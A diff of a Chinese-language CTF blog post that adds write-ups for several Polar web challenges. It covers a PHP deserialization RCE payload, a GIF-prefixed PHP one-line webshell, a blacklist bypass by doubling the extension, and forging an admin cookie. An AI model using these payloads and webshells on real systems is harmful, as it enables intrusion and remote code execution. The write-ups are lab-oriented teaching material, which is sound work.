@@ -113,8 +113,28 @@
 <meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/19-4.png">
 <meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/20-1.png">
 <meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/20-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/21-1.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/21-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/22-1.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/22-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/22-3.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/22-4.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/22-5.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/22-6.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/23-1.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/23-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/23-3.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/24-1.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/24-2.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/24-3.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/24-4.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/24-5.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/24-6.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/24-7.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/24-8.png">
+<meta property="og:image" content="http://linguo-ok.github.io/2025/12/31/polar-web-easy-1/24-9.png">
 <meta property="article:published_time" content="2025-12-30T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-01-02T13:53:31.706Z">
+<meta property="article:modified_time" content="2026-01-03T04:51:41.576Z">
 <meta property="article:author" content="linguo">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary_large_image">
@@ -311,7 +331,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.9k 字
+          8.3k 字
         
       </span>
     
@@ -322,7 +342,7 @@
         
         
         
-          58 分钟
+          70 分钟
         
       </span>
     
@@ -505,7 +525,7 @@
 <p>当然我们还可以将这段字符串输入<strong>控制台</strong>，直接执行即可得到 flag</p>
 <p><img src="/2025/12/31/polar-web-easy-1/4-4.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="seek-flag"><a href="#seek-flag" class="headerlink" title="seek flag"></a>seek flag</h1><blockquote>
-<p>考查点：前端响应包、robots.txt、Cookie修改</p>
+<p>考查点：前端响应包、robots.txt、cookie伪造</p>
 </blockquote>
 <p><img src="/2025/12/31/polar-web-easy-1/5-1.png" srcset="/img/loading.gif" lazyload></p>
 <p>访问题目链接，页面显示上图中信息，既然提到前端，我们不妨先看看源码</p>
@@ -825,6 +845,87 @@
 <p><img src="/2025/12/31/polar-web-easy-1/20-1.png" srcset="/img/loading.gif" lazyload></p>
 <p>访问该路径即可得到 flag</p>
 <p><img src="/2025/12/31/polar-web-easy-1/20-2.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice"></a>php very nice</h1><blockquote>
+<p>考查点：PHP代码审计、PHP反序列化</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span></span><br><span class="hljs-class"> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$sys</span>=<span class="hljs-string">&#x27;Can you find the leak?&#x27;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;sys);<br>     &#125;<br> &#125;<br> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>分析源码，定义了一个 Example 类，其中定义了一个 public 变量（被声明为 public 的属性或方法可以在<strong>类的内部、外部以及子类中</strong>自由访问，公有属性）</p>
+<p>下面的 <code>__destruct()</code> 是 PHP面向对象编程的一个重要的魔法函数——析构函数，该函数会在类的一个对象被删除时自动调用，当调用此函数时会执行 <strong>eval</strong>，看到 <strong>eval</strong> 我们就应该想到可以 <strong>rce</strong> 了</p>
+<blockquote>
+<p>当销毁一个对象时才会调用对象的析构函数，一般情况下，销毁一个对象的触发时机为</p>
+<ol>
+<li>主动调用 <code>unset( $obj )</code></li>
+<li>主动调用 <code>$obj = NULL</code></li>
+<li>程序自动结束</li>
+</ol>
+</blockquote>
+<p>定义完 Example 类后，有一个 <strong>unserialize</strong> 函数，这说明我们要输入序列化的值，这样经过反序列化后才能够还原成原本字符串，从而通过 eval 执行命令</p>
+<blockquote>
+<p><strong>unserialize()</strong> 函数用于将通过 <strong>serialize()</strong> 函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。它可以将字符串转换回原始的 PHP 数据类型，如整数、浮点数、字符串、数组或对象。示例如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$unserialized_data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$unserialized_data</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># Array ( [0] =&gt; Google [1] =&gt; Runoob [2] =&gt; Facebook )</span><br></code></pre></td></tr></table></figure>
+</blockquote>
+<p>分析POP链：</p>
+<ol>
+<li>我们需要构造一个 Example 对象的序列化字符串，其中 <strong>sys</strong> 属性为我们想要执行的PHP代码。</li>
+<li>由于在反序列化后，对象会被创建，而在脚本结束时对象会被销毁，触发 __destruct() 方法，从而执行 eval。</li>
+</ol>
+<p>此处我们注意到：我们传入的序列化字符串会被反序列化成一个 Example 对象，并且其 sys 属性值是我们可控的，因此，我们可以通过控制 sys 属性来执行任意代码。下面是攻击脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 构造命令执行序列化字符串</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sys</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// 创建对象并设置恶意payload</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();<br><span class="hljs-variable">$obj</span>-&gt;sys = <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;  <span class="hljs-comment">// 或读取flag的其他命令</span><br><br><span class="hljs-comment">// 生成序列化字符串</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>代码运行结果：<code>O:7:&quot;Example&quot;:1:&#123;s:3:&quot;sys&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;&#125;</code></p>
+<p><img src="/2025/12/31/polar-web-easy-1/21-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来就是构造读取 flag.php 的序列化字符串，将脚本中命令修改一下即可：<code>O:7:&quot;Example&quot;:1:&#123;s:3:&quot;sys&quot;;s:23:&quot;system(&#39;cat flag.php&#39;);&quot;;&#125;</code></p>
+<p>当我们传入此值后页面中并无回显（注意：不要忘了查看源码，也许被注释了）</p>
+<p><img src="/2025/12/31/polar-web-easy-1/21-2.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h1><blockquote>
+<p>考查点：文件上传前端绕过</p>
+</blockquote>
+<p>访问链接，一看就是文件上传</p>
+<p><img src="/2025/12/31/polar-web-easy-1/22-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接上传带马的 php 试试</p>
+<p><img src="/2025/12/31/polar-web-easy-1/22-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>php 上传不了，提示我们要上传 gif 文件，那么我们就创建一个空白 gif，用记事本在其中写以下内容，然后尝试上传</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ha&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/12/31/polar-web-easy-1/22-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到我们构造的文件上传成功了，且泄露了上传文件所在路径，文件中写入的 php 也未被过滤，那很有可能从前端就能够绕过，既如此，那么我们就抓包修改文件后缀试试</p>
+<p><img src="/2025/12/31/polar-web-easy-1/22-4.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功绕过，此时我们用蚁剑连接就可以了</p>
+<p><img src="/2025/12/31/polar-web-easy-1/22-5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/12/31/polar-web-easy-1/22-6.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h1><blockquote>
+<p>考查点：cookie伪造</p>
+</blockquote>
+<p>访问链接，直接提示我们需要 admin 身份</p>
+<p><img src="/2025/12/31/polar-web-easy-1/23-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>话不多说，直接看 cookie，有一个参数 user</p>
+<p><img src="/2025/12/31/polar-web-easy-1/23-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们将此值改为 admin，刷新页面就可以了</p>
+<p><img src="/2025/12/31/polar-web-easy-1/23-3.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><blockquote>
+<p>考查点：文件上传黑名单双写绕过</p>
+</blockquote>
+<p>访问链接，提示需要上传一个 <strong>webshell</strong></p>
+<p><img src="/2025/12/31/polar-web-easy-1/24-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>那么我们就直接传入带马 php，看看会怎么样</p>
+<p><img src="/2025/12/31/polar-web-easy-1/24-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>感觉像是上传成功了，但不确定，从源码查看上传的图片，从地址栏看到文件后缀被截断了，文件未被当作 php 代码解析</p>
+<p><img src="/2025/12/31/polar-web-easy-1/24-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>呕吼，在源码注释中发现 <code>?action=show_code</code>，从名字来看就知道应该是显示代码，那我们就访问看看，果然是文件上传的逻辑代码</p>
+<p><img src="/2025/12/31/polar-web-easy-1/24-4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/12/31/polar-web-easy-1/24-5.png" srcset="/img/loading.gif" lazyload></p>
+<p>分析一下代码，需要我们以 POST 方式传入参数 <code>submit</code>，用于判断<strong>是否提交了上传表单</strong>，<code>if (file_exists(UPLOAD_PATH))</code> 会检查指定的上传目录(UPLOAD_PATH)是否存在，然后定义了一个黑名单 <strong>$deny_ext</strong>（不允许上传的文件扩展名）</p>
+<p><code>$file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</code> 获取上传文件的原始名称，并去除两边的空格</p>
+<p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code> 使用 <strong>str_ireplace</strong> 函数将黑名单中的扩展名从文件名中替换为空字符串。注意：这里使用的是不区分大小写的替换，<code>str_ireplace</code> 是<strong>全局替换黑名单后缀为空</strong>，但可通过 “<strong>双写禁止后缀</strong>” 的方式绕过</p>
+<p><code>$temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</code> 获取上传文件的临时路径，<code>$img_path = UPLOAD_PATH.&#39;/&#39;.rand(10000,99999).$file_name;</code> 构造目标路径，包括上传目录、一个随机数（10000到99999之间）和经过处理后的文件名，<code>if (move_uploaded_file($temp_file, $img_path)) </code> 将临时文件移动到目标路径。如果成功，设置<code>$is_upload</code>为true，否则设置错误消息</p>
+<p>分析完成，接下来我们就尝试进行<strong>双写绕过</strong>，用 burp 抓包修改文件后缀然后放包</p>
+<p><img src="/2025/12/31/polar-web-easy-1/24-6.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看源码，可以看到上传文件的路径</p>
+<p><img src="/2025/12/31/polar-web-easy-1/24-7.png" srcset="/img/loading.gif" lazyload></p>
+<p>蚁剑连接成功</p>
+<p><img src="/2025/12/31/polar-web-easy-1/24-8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/12/31/polar-web-easy-1/24-9.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
